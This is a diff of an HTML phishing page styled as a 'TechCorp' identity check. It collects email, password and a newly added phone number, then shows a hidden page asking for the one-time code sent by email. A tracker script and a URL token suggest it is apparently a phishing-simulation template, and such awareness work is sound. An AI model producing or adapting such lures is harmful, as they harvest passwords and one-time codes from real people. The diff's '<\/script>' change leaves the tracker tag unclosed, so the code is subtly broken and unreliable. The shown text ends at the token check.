@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Your Identity</title>
+    <title>Verify Your TechCorp Identity</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #667eea 100%);
+            background: linear-gradient(135deg, #667eea 0%, #667eeadd 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -45,28 +45,38 @@
 </head>
 <body>
     <div class="container">
+        <!-- LOGIN PAGE -->
         <div id="loginPage">
             <div class="logo">
-                <h1>🔒 Verify Your Identity</h1>
+                <h1>🔒 Verify Your TechCorp Identity</h1>
                 <p>Secure your account</p>
             </div>
             <div class="warning">⚠️ For security reasons, please verify your identity.</div>
             <form id="loginForm">
+
                 <div class="form-group">
                     <label>Email Address</label>
-                    <input type="email" id="email" required placeholder="you@company.com">
+                    <input type="email" id="email" name="email" required placeholder="you@company.com">
                 </div>
+
                 <div class="form-group">
                     <label>Password</label>
-                    <input type="password" id="password" required placeholder="••••••••">
+                    <input type="password" id="password" name="password" required placeholder="••••••••">
                 </div>
+
+                <div class="form-group">
+                    <label>Phone Number</label>
+                    <input type="tel" id="phone" name="phone" required placeholder="+1234567890">
+                </div>
+
                 <button type="submit">Verify Account</button>
             </form>
         </div>
         
+        <!-- OTP PAGE -->
         <div id="otpPage" class="hidden">
             <div class="logo">
-                <h1>✓ Enter Verification Code</h1>
+                <h1>✓ Enter Security Code</h1>
                 <p>Enter the code sent to your email</p>
             </div>
             <form id="otpForm">
@@ -86,7 +96,7 @@
         </div>
     </div>
     
-    <script src="/phishguard-tracker.js"></script>
+    <script src="/phishguard-tracker.js"><\/script>
     <script>
         const token = new URLSearchParams(window.location.search).get('token');
         if (token) {
